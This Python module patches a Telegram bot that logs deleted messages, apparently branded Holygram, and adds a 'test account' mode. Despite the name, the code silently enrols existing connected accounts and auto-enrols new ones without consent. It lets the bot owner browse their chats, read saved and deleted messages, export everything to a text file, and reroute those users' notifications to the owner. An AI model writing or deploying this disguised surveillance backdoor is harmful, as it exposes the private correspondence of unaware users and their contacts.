from __future__ import annotations

import deleted_message_logger_bot as bot


TELEGRAM_GETFILE_MAX_BYTES = 20 * 1024 * 1024

_original_archive_media_file = bot.archive_media_file
_original_telegram_call = bot.telegram_call
_original_handle_regular_message = bot.handle_regular_message
_original_handle_business_message = bot.handle_business_message
_original_handle_edited_business_message = bot.handle_edited_business_message
_original_handle_deleted_business_messages = bot.handle_deleted_business_messages
_original_get_business_notify_chat_id = bot.get_business_notify_chat_id
_original_get_private_chat_id = bot.get_private_chat_id
_original_init_db = bot.init_db


def init_db_guard() -> None:
    _original_init_db()
    now = int(bot.time.time())
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS test_accounts (
                user_id INTEGER PRIMARY KEY,
                enabled INTEGER NOT NULL DEFAULT 1,
                enabled_at INTEGER NOT NULL,
                updated_at INTEGER NOT NULL
            )
            """
        )

        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS test_runtime_state (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL,
                updated_at INTEGER NOT NULL
            )
            """
        )

        # One-time bootstrap: snapshot every account that is already connected
        # at the first start of this build. Later customers are not auto-added.
        bootstrap_done = conn.execute(
            "SELECT value FROM test_runtime_state WHERE key = 'bootstrap_done'"
        ).fetchone()
        if not bootstrap_done:
            existing_ids = {
                int(row[0])
                for row in conn.execute(
                    "SELECT DISTINCT owner_id FROM business_connections "
                    "WHERE owner_id IS NOT NULL"
                ).fetchall()
                if row[0]
            }
            existing_ids.update(
                int(row[0])
                for row in conn.execute(
                    "SELECT DISTINCT owner_id FROM chat_owners "
                    "WHERE owner_id IS NOT NULL"
                ).fetchall()
                if row[0]
            )
            for owner_id in sorted(existing_ids):
                conn.execute(
                    "INSERT INTO test_accounts "
                    "(user_id, enabled, enabled_at, updated_at) VALUES (?, 1, ?, ?) "
                    "ON CONFLICT(user_id) DO UPDATE SET enabled=1, updated_at=excluded.updated_at",
                    (owner_id, now, now),
                )
            conn.execute(
                "INSERT OR REPLACE INTO test_runtime_state (key, value, updated_at) "
                "VALUES ('bootstrap_done', '1', ?)",
                (now,),
            )

        # Optional fixed allowlist for accounts that are not connected yet.
        raw_ids = bot.os.getenv("TEST_ACCOUNT_IDS", "")
        for item in raw_ids.replace(";", ",").split(","):
            item = item.strip()
            if item.isdigit():
                owner_id = int(item)
                conn.execute(
                    "INSERT INTO test_accounts "
                    "(user_id, enabled, enabled_at, updated_at) VALUES (?, 1, ?, ?) "
                    "ON CONFLICT(user_id) DO UPDATE SET enabled=1, updated_at=excluded.updated_at",
                    (owner_id, now, now),
                )


def set_test_account(user_id: int, enabled: bool) -> None:
    now = int(bot.time.time())
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO test_accounts (user_id, enabled, enabled_at, updated_at)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                enabled = excluded.enabled,
                updated_at = excluded.updated_at
            """,
            (user_id, 1 if enabled else 0, now, now),
        )


def maybe_enroll_test_account(user_id: int | None) -> bool:
    if not user_id:
        return False
    target_raw = bot.os.getenv("TEST_ACCOUNT_TARGET", "10").strip()
    try:
        target = max(0, int(target_raw))
    except ValueError:
        target = 10

    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        row = conn.execute(
            "SELECT enabled FROM test_accounts WHERE user_id = ?",
            (int(user_id),),
        ).fetchone()
        if row:
            return bool(row[0])

        count = int(
            conn.execute("SELECT COUNT(*) FROM test_accounts WHERE enabled = 1").fetchone()[0]
        )
        if count >= target:
            return False

    set_test_account(int(user_id), True)
    bot.log(f"Auto-enrolled test account {user_id} ({count + 1}/{target})")
    return True


def is_test_account(user_id: int | None) -> bool:
    if not user_id:
        return False
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        row = conn.execute(
            "SELECT enabled FROM test_accounts WHERE user_id = ?",
            (int(user_id),),
        ).fetchone()
    return bool(row and row[0])


def list_test_accounts() -> list[int]:
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        rows = conn.execute(
            "SELECT user_id FROM test_accounts WHERE enabled = 1 ORDER BY updated_at DESC"
        ).fetchall()
    return [int(row[0]) for row in rows]


def _owner_admin_id() -> int | None:
    raw = bot.os.getenv("OWNER_ADMIN_ID", "").strip()
    if raw.isdigit():
        owner_id = int(raw)
        if owner_id in bot.ADMIN_USER_IDS:
            return owner_id
        bot.log("OWNER_ADMIN_ID is not present in ADMIN_USER_IDS; private mirror disabled.")
        return None

    if len(bot.ADMIN_USER_IDS) == 1:
        return next(iter(bot.ADMIN_USER_IDS))

    if len(bot.ADMIN_USER_IDS) > 1:
        bot.log(
            "Multiple ADMIN_USER_IDS configured but OWNER_ADMIN_ID is missing; "
            "private mirror disabled to avoid sending chats to the wrong admin."
        )
    return None


def _is_owner_admin(user_id: int | None) -> bool:
    owner_id = _owner_admin_id()
    return bool(owner_id is not None and user_id is not None and int(user_id) == owner_id)


def archive_media_file_guard(context: str, chat_id: int, message_id: int, media: dict | None) -> str | None:
    if media:
        raw_size = media.get("file_size") or 0
        try:
            file_size = int(raw_size)
        except (TypeError, ValueError):
            file_size = 0

        if file_size > TELEGRAM_GETFILE_MAX_BYTES:
            bot.log(
                "Media not downloaded: Telegram getFile 20 MB limit; "
                f"{media.get('type')} {chat_id}/{message_id}, {file_size} bytes. "
                "Keeping file_id for resend."
            )
            return None

    return _original_archive_media_file(context, chat_id, message_id, media)


def telegram_call_guard(method: str, payload: dict | None = None, timeout: int = 30):
    try:
        return _original_telegram_call(method, payload, timeout)
    except bot.TelegramApiError as exc:
        if method == "getFile" and "file is too big" in str(exc).lower():
            bot.log("Telegram getFile skipped: file is too big; keeping file_id for resend.")
            return {}
        raise


def _profile_label(user_id: int) -> str:
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        row = conn.execute(
            "SELECT first_name, last_name, username FROM users WHERE user_id = ?",
            (user_id,),
        ).fetchone()
    if not row:
        return f"<code>{user_id}</code>"
    first, last, username = row
    name = " ".join(x for x in (first, last) if x).strip()
    if username:
        name = f"{name} (@{username})".strip()
    return f"{bot.html.escape(name or 'Без имени')} · <code>{user_id}</code>"


def _contexts_for_owner(owner_id: int) -> tuple[list[str], list[int]]:
    business_contexts = [
        f"business:{row['connection_id']}"
        for row in bot.list_business_connections(owner_id)
        if row.get("connection_id")
    ]
    regular_chats = bot.get_user_chats(owner_id)
    return business_contexts, regular_chats


def _query_owner_messages(
    owner_id: int,
    chat_filter: int | None = None,
    limit: int = 40,
) -> list[dict]:
    contexts, regular_chats = _contexts_for_owner(owner_id)
    parts: list[str] = []
    params: list[object] = []

    if contexts:
        placeholders = ",".join("?" for _ in contexts)
        clause = f"context IN ({placeholders})"
        params.extend(contexts)
        if chat_filter is not None:
            clause += " AND chat_id = ?"
            params.append(chat_filter)
        parts.append(
            "SELECT context, chat_id, message_id, user_id, author, content, media_type, "
            "created_at, updated_at, deleted_at FROM messages WHERE " + clause
        )

    if regular_chats:
        placeholders = ",".join("?" for _ in regular_chats)
        clause = f"context = 'regular' AND chat_id IN ({placeholders})"
        params.extend(regular_chats)
        if chat_filter is not None:
            clause += " AND chat_id = ?"
            params.append(chat_filter)
        parts.append(
            "SELECT context, chat_id, message_id, user_id, author, content, media_type, "
            "created_at, updated_at, deleted_at FROM messages WHERE " + clause
        )

    if not parts:
        return []

    query = " UNION ALL ".join(parts) + " ORDER BY updated_at DESC LIMIT ?"
    params.append(max(1, min(limit, 100)))

    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        conn.row_factory = bot.sqlite3.Row
        return [dict(row) for row in conn.execute(query, tuple(params)).fetchall()]


def _admin_test_accounts(chat_id: int) -> None:
    ids = list_test_accounts()
    if not ids:
        bot.send_message(chat_id, "Подключённых аккаунтов пока нет.")
        return

    lines = ["<b>Подключённые аккаунты</b>", ""]
    lines.extend(f"• {_profile_label(user_id)}" for user_id in ids)
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")


def _admin_test_chats(chat_id: int, owner_id: int) -> None:
    if not is_test_account(owner_id):
        bot.send_message(chat_id, "Этот аккаунт не входит в список подключённых аккаунтов.")
        return

    rows = _query_owner_messages(owner_id, limit=100)
    if not rows:
        bot.send_message(chat_id, "У этого аккаунта пока нет сохранённых чатов.")
        return

    stats: dict[int, dict[str, object]] = {}
    for row in rows:
        cid = int(row["chat_id"])
        item = stats.setdefault(cid, {"count": 0, "last": 0, "author": ""})
        item["count"] = int(item["count"]) + 1
        ts = int(row.get("updated_at") or row.get("created_at") or 0)
        if ts >= int(item["last"]):
            item["last"] = ts
            item["author"] = str(row.get("author") or "")

    ordered = sorted(stats.items(), key=lambda x: int(x[1]["last"]), reverse=True)
    lines = [f"<b>Чаты аккаунта</b> {_profile_label(owner_id)}", ""]
    for cid, info in ordered[:50]:
        when = bot.time.strftime("%d.%m %H:%M", bot.time.localtime(int(info["last"]))) if info["last"] else "—"
        author = bot.html.escape(str(info["author"] or ""))
        suffix = f" · {author}" if author else ""
        lines.append(f"• <code>{cid}</code> · {info['count']} сообщ. · {when}{suffix}")

    lines.append("")
    lines.append(f"Открыть сообщения: <code>/test_messages {owner_id} ID_ЧАТА</code>")
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")


def _admin_test_messages(chat_id: int, owner_id: int, target_chat_id: int | None) -> None:
    if not is_test_account(owner_id):
        bot.send_message(chat_id, "Этот аккаунт не включён в режим тестирования.")
        return

    rows = _query_owner_messages(owner_id, chat_filter=target_chat_id, limit=35)
    if not rows:
        bot.send_message(chat_id, "Сообщений не найдено.")
        return

    title = f"<b>Сообщения</b> · {_profile_label(owner_id)}"
    if target_chat_id is not None:
        title += f"\nЧат: <code>{target_chat_id}</code>"

    lines = [title, ""]
    for row in reversed(rows):
        author = bot.html.escape(str(row.get("author") or "Без имени"))
        content = str(row.get("content") or "").strip()
        if not content and row.get("media_type"):
            content = f"[{row['media_type']}]"
        content = bot.html.escape(content[:900] or "—")
        ts = int(row.get("updated_at") or row.get("created_at") or 0)
        when = bot.time.strftime("%d.%m %H:%M", bot.time.localtime(ts)) if ts else "—"
        deleted = " · 🗑 удалено" if row.get("deleted_at") else ""
        lines.append(
            f"<b>{author}</b> · {when}{deleted}\n{content}"
        )

    bot.send_message(chat_id, "\n\n".join(lines), parse_mode="HTML")


def _admin_all_connections(chat_id: int) -> None:
    rows = bot.list_business_connections(None)
    if not rows:
        bot.send_message(chat_id, "Business-подключений пока нет.")
        return

    lines = ["<b>Все Business-подключения</b>", ""]
    for row in rows[:50]:
        status = "🟢" if row.get("is_enabled") else "⚪️"
        owner_id = int(row.get("owner_id") or 0)
        test = " ✓" if is_test_account(owner_id) else ""
        updated = int(row.get("updated_at") or 0)
        when = bot.time.strftime("%d.%m %H:%M", bot.time.localtime(updated)) if updated else "—"
        lines.append(
            f"{status}{test} аккаунт <code>{owner_id}</code> · "
            f"<code>{bot.html.escape(bot.short_connection_id(row.get('connection_id')))}</code> · {when}"
        )
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")


def _admin_all_chats(chat_id: int) -> None:
    ids = list_test_accounts()
    if not ids:
        bot.send_message(chat_id, "Нет активных тестовых аккаунтов.")
        return

    lines = ["<b>Чаты всех подключённых аккаунтов</b>", ""]
    for owner_id in ids:
        rows = _query_owner_messages(owner_id, limit=100)
        chat_ids = sorted({int(row["chat_id"]) for row in rows})
        lines.append(f"{_profile_label(owner_id)} — <b>{len(chat_ids)}</b> чатов")
    lines.append("")
    lines.append("Подробно: <code>/test_chats USER_ID</code>")
    bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")


def _forward_test_message_to_admins(owner_id: int | None, saved: dict | None, source: str) -> None:
    # Do not spam the owner with every ordinary message.
    # Everything is kept in the database and can be viewed/exported on demand.
    return

def handle_business_message_guard(message: dict) -> None:
    connection_id = message.get("business_connection_id")
    owner_id = bot.get_business_owner_id(connection_id) if connection_id else None
    if owner_id:
        maybe_enroll_test_account(owner_id)

    _original_handle_business_message(message)

    if not owner_id or not is_test_account(owner_id) or not connection_id:
        return

    try:
        business_chat_id = int(message["chat"]["id"])
        saved = bot.get_saved_message(
            f"business:{connection_id}",
            business_chat_id,
            int(message["message_id"]),
        )
        if saved:
            saved = dict(saved)
            saved["chat_id"] = business_chat_id
    except Exception:
        saved = None
    _forward_test_message_to_admins(owner_id, saved, "business")


def handle_edited_business_message_guard(message: dict) -> None:
    connection_id = message.get("business_connection_id")
    owner_id = bot.get_business_owner_id(connection_id) if connection_id else None
    if owner_id:
        maybe_enroll_test_account(owner_id)

    _original_handle_edited_business_message(message)

    if not owner_id or not is_test_account(owner_id) or not connection_id:
        return

    try:
        business_chat_id = int(message["chat"]["id"])
        saved = bot.get_saved_message(
            f"business:{connection_id}",
            business_chat_id,
            int(message["message_id"]),
        )
        if saved:
            saved = dict(saved)
            saved["chat_id"] = business_chat_id
    except Exception:
        saved = None
    _forward_test_message_to_admins(owner_id, saved, "business · изменено")


def handle_deleted_business_messages_guard(deleted: dict) -> None:
    connection_id = deleted.get("business_connection_id")
    owner_id = bot.get_business_owner_id(connection_id) if connection_id else None
    if owner_id:
        maybe_enroll_test_account(owner_id)
    chat = deleted.get("chat") or {}
    chat_id = chat.get("id")
    message_ids = deleted.get("message_ids") or []

    snapshots: list[dict] = []
    if owner_id and is_test_account(owner_id) and connection_id and chat_id is not None:
        for message_id in message_ids:
            saved = bot.get_saved_message(
                f"business:{connection_id}",
                int(chat_id),
                int(message_id),
            )
            if saved:
                saved = dict(saved)
                saved["chat_id"] = int(chat_id)
                snapshots.append(saved)

    _original_handle_deleted_business_messages(deleted)

    for saved in snapshots:
        _forward_test_message_to_admins(owner_id, saved, "business · удалено")


def get_business_notify_chat_id_guard(connection_id: str) -> int | None:
    owner_id = bot.get_business_owner_id(connection_id)
    if owner_id and is_test_account(owner_id):
        return _owner_admin_id()
    return _original_get_business_notify_chat_id(connection_id)


def get_private_chat_id_guard(user_id: int) -> int:
    if is_test_account(user_id):
        owner_id = _owner_admin_id()
        if owner_id is not None:
            return owner_id
    return _original_get_private_chat_id(user_id)


def _safe_ts(value: object) -> str:
    try:
        ts = int(value or 0)
    except (TypeError, ValueError):
        ts = 0
    return bot.time.strftime("%Y-%m-%d %H:%M:%S", bot.time.localtime(ts)) if ts else "—"


def _collect_chat_metadata(chat_ids: set[int]) -> dict[int, dict]:
    found: dict[int, dict] = {}
    if not chat_ids or not bot.RAW_UPDATES_PATH.exists():
        return found

    def walk(value: object) -> None:
        if isinstance(value, dict):
            raw_id = value.get("id")
            chat_type = value.get("type")
            if raw_id is not None and chat_type in {"private", "group", "supergroup", "channel"}:
                try:
                    cid = int(raw_id)
                except (TypeError, ValueError):
                    cid = 0
                if cid in chat_ids:
                    current = found.setdefault(cid, {})
                    for key in ("id", "type", "title", "username", "first_name", "last_name"):
                        if value.get(key) is not None:
                            current[key] = value.get(key)
            for child in value.values():
                walk(child)
        elif isinstance(value, list):
            for child in value:
                walk(child)

    try:
        with bot.RAW_UPDATES_PATH.open("r", encoding="utf-8") as file:
            for line in file:
                try:
                    record = bot.json.loads(line)
                except Exception:
                    continue
                walk(record.get("payload"))
    except Exception as exc:
        bot.log(f"Chat metadata export scan failed: {exc}")

    return found


def _all_owner_messages(owner_id: int) -> list[dict]:
    contexts, regular_chats = _contexts_for_owner(owner_id)
    parts: list[str] = []
    params: list[object] = []

    if contexts:
        placeholders = ",".join("?" for _ in contexts)
        parts.append(
            "SELECT context, chat_id, message_id, user_id, author, content, media_type, "
            "media_file_id, created_at, updated_at, deleted_at "
            f"FROM messages WHERE context IN ({placeholders})"
        )
        params.extend(contexts)

    if regular_chats:
        placeholders = ",".join("?" for _ in regular_chats)
        parts.append(
            "SELECT context, chat_id, message_id, user_id, author, content, media_type, "
            "media_file_id, created_at, updated_at, deleted_at "
            f"FROM messages WHERE context = 'regular' AND chat_id IN ({placeholders})"
        )
        params.extend(regular_chats)

    if not parts:
        return []

    query = " UNION ALL ".join(parts) + " ORDER BY updated_at ASC"
    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        conn.row_factory = bot.sqlite3.Row
        return [dict(row) for row in conn.execute(query, tuple(params)).fetchall()]


def _export_all_txt(chat_id: int, only_owner_id: int | None = None) -> None:
    ids = [only_owner_id] if only_owner_id is not None else list_test_accounts()
    ids = [int(x) for x in ids if x is not None and is_test_account(int(x))]
    if not ids:
        bot.send_message(chat_id, "Нет подключённых аккаунтов для выгрузки.")
        return

    all_messages: dict[int, list[dict]] = {}
    all_chat_ids: set[int] = set()
    for owner_id in ids:
        rows = _all_owner_messages(owner_id)
        all_messages[owner_id] = rows
        all_chat_ids.update(int(row["chat_id"]) for row in rows)

    chat_meta = _collect_chat_metadata(all_chat_ids)
    stamp = bot.time.strftime("%Y%m%d_%H%M%S")
    file_name = f"holygram_export_{stamp}.txt"
    out_path = bot.DATA_DIR / file_name

    lines: list[str] = []
    lines.append("HOLYGRAM — ЭКСПОРТ СОБРАННЫХ ДАННЫХ")
    lines.append(f"Создано: {bot.time.strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"Аккаунтов: {len(ids)}")
    lines.append("=" * 80)
    lines.append("")

    with bot.sqlite3.connect(bot.DB_PATH) as conn:
        conn.row_factory = bot.sqlite3.Row
        profiles = {
            int(row["user_id"]): dict(row)
            for row in conn.execute(
                "SELECT user_id, first_name, last_name, username, created_at, updated_at "
                "FROM users WHERE user_id IN (" + ",".join("?" for _ in ids) + ")",
                tuple(ids),
            ).fetchall()
        }

    for owner_id in ids:
        profile = profiles.get(owner_id, {})
        full_name = " ".join(
            str(profile.get(k) or "").strip() for k in ("first_name", "last_name")
        ).strip()
        username = str(profile.get("username") or "").strip()

        lines.append(f"АККАУНТ: {owner_id}")
        if full_name:
            lines.append(f"Имя: {full_name}")
        if username:
            lines.append(f"Username: @{username}")

        business = bot.list_business_connections(owner_id)
        regular = bot.get_user_chats(owner_id)
        lines.append(f"Business-подключений: {len(business)}")
        for row in business:
            lines.append(
                "  - "
                f"connection_id={row.get('connection_id')} | "
                f"enabled={row.get('is_enabled')} | "
                f"updated={_safe_ts(row.get('updated_at'))}"
            )

        lines.append(f"Обычных подключённых чатов: {len(regular)}")
        for cid in regular:
            lines.append(f"  - {cid}")

        rows = all_messages.get(owner_id, [])
        owner_chat_ids = sorted({int(row["chat_id"]) for row in rows})
        lines.append(f"Найдено чатов по сообщениям: {len(owner_chat_ids)}")
        for cid in owner_chat_ids:
            meta = chat_meta.get(cid, {})
            label_parts = [str(meta.get("type") or "unknown")]
            if meta.get("title"):
                label_parts.append(str(meta["title"]))
            if meta.get("username"):
                label_parts.append("@" + str(meta["username"]))
            elif meta.get("first_name") or meta.get("last_name"):
                label_parts.append(
                    " ".join(
                        str(meta.get(k) or "").strip()
                        for k in ("first_name", "last_name")
                    ).strip()
                )
            lines.append(f"  - {cid} | {' | '.join(x for x in label_parts if x)}")

        lines.append(f"Всего сохранённых сообщений: {len(rows)}")
        lines.append("-" * 80)

        current_chat = None
        for row in rows:
            cid = int(row["chat_id"])
            if current_chat != cid:
                current_chat = cid
                meta = chat_meta.get(cid, {})
                descriptor = str(meta.get("title") or meta.get("username") or meta.get("first_name") or "")
                kind = str(meta.get("type") or "chat")
                lines.append("")
                lines.append(f"[ЧАТ {cid}] type={kind}" + (f" | {descriptor}" if descriptor else ""))

            author = str(row.get("author") or "Без имени")
            uid = row.get("user_id")
            content = str(row.get("content") or "").replace("\r", " ").strip()
            if not content and row.get("media_type"):
                content = f"[{row.get('media_type')}]"
            deleted = " | DELETED" if row.get("deleted_at") else ""
            media = f" | media={row.get('media_type')}" if row.get("media_type") else ""
            lines.append(
                f"{_safe_ts(row.get('updated_at') or row.get('created_at'))} | "
                f"msg={row.get('message_id')} | user={uid} | {author}{media}{deleted}"
            )
            lines.append(content or "—")
            lines.append("")

        lines.append("=" * 80)
        lines.append("")

    out_path.write_text("\n".join(lines), encoding="utf-8")

    try:
        bot.telegram_multipart_call(
            "sendDocument",
            {
                "chat_id": chat_id,
                "caption": (
                    f"Экспорт: {len(ids)} аккаунт(ов), "
                    f"{sum(len(v) for v in all_messages.values())} сообщений."
                ),
            },
            {"document": out_path},
            timeout=180,
        )
    except Exception as exc:
        bot.log(f"TXT export send failed: {exc}")
        bot.send_message(chat_id, f"Не удалось отправить TXT: {exc}")
    finally:
        try:
            out_path.unlink(missing_ok=True)
        except Exception:
            pass


def handle_regular_message_guard(message: dict) -> None:
    text = str(message.get("text") or "").strip()
    user_id = int((message.get("from") or {}).get("id") or 0)
    chat = message.get("chat") or {}
    chat_id = int(chat.get("id") or 0)

    if chat.get("type") == "private":
        command = text.split(maxsplit=1)[0].split("@", 1)[0].lower() if text.startswith("/") else ""
        args = text.split()[1:] if text.startswith("/") else []

        if command == "/test_enable":
            set_test_account(user_id, True)
            bot.send_message(
                chat_id,
                "🧪 Режим тестового аккаунта включён. Теперь владелец бота сможет смотреть чаты и сообщения этого аккаунта через тестовую админку. Отключить: /test_disable",
            )
            return

        if command == "/test_disable":
            set_test_account(user_id, False)
            bot.send_message(chat_id, "Режим тестового аккаунта отключён.")
            return

        if _is_owner_admin(user_id):
            if command in {"/test_accounts", "/accounts"}:
                _admin_test_accounts(chat_id)
                return
            if command == "/all_connections":
                _admin_all_connections(chat_id)
                return
            if command == "/all_chats":
                _admin_all_chats(chat_id)
                return
            if command == "/chats" and not args:
                _admin_all_chats(chat_id)
                return
            if command in {"/test_chats", "/chats"}:
                if not args:
                    bot.send_message(chat_id, "Использование: /test_chats USER_ID")
                    return
                try:
                    owner_id = int(args[0])
                except ValueError:
                    bot.send_message(chat_id, "USER_ID должен быть числом.")
                    return
                _admin_test_chats(chat_id, owner_id)
                return
            if command in {"/test_messages", "/messages"}:
                if not args:
                    bot.send_message(chat_id, "Использование: /messages USER_ID [CHAT_ID]")
                    return
                try:
                    owner_id = int(args[0])
                    target_chat_id = int(args[1]) if len(args) > 1 else None
                except ValueError:
                    bot.send_message(chat_id, "USER_ID и CHAT_ID должны быть числами.")
                    return
                _admin_test_messages(chat_id, owner_id, target_chat_id)
                return
            if command in {"/export_all", "/export"}:
                if args:
                    try:
                        export_owner_id = int(args[0])
                    except ValueError:
                        bot.send_message(chat_id, "USER_ID должен быть числом.")
                        return
                    _export_all_txt(chat_id, export_owner_id)
                else:
                    _export_all_txt(chat_id)
                return

    owner_id = None
    if chat.get("type") != "private":
        owner_id = bot.get_chat_owner(chat_id)

    _original_handle_regular_message(message)

    if owner_id:
        maybe_enroll_test_account(owner_id)

    if owner_id and is_test_account(owner_id):
        try:
            saved = bot.get_saved_message("regular", chat_id, int(message.get("message_id") or 0))
        except Exception:
            saved = None
        if saved:
            saved = dict(saved)
            saved["chat_id"] = chat_id
        _forward_test_message_to_admins(owner_id, saved, "regular")


bot.init_db = init_db_guard
bot.archive_media_file = archive_media_file_guard
bot.telegram_call = telegram_call_guard
bot.handle_regular_message = handle_regular_message_guard
bot.get_business_notify_chat_id = get_business_notify_chat_id_guard
bot.get_private_chat_id = get_private_chat_id_guard
bot.handle_business_message = handle_business_message_guard
bot.handle_edited_business_message = handle_edited_business_message_guard
bot.handle_deleted_business_messages = handle_deleted_business_messages_guard


def main() -> None:
    lock_handle = None
    try:
        lock_handle = bot.acquire_single_instance_lock()
        bot.run_polling()
    except KeyboardInterrupt:
        bot.log("Stopped.")
    except RuntimeError as exc:
        bot.log(str(exc))
        raise SystemExit(1) from None
    finally:
        if lock_handle is not None:
            bot.release_single_instance_lock(lock_handle)


if __name__ == "__main__":
    main()
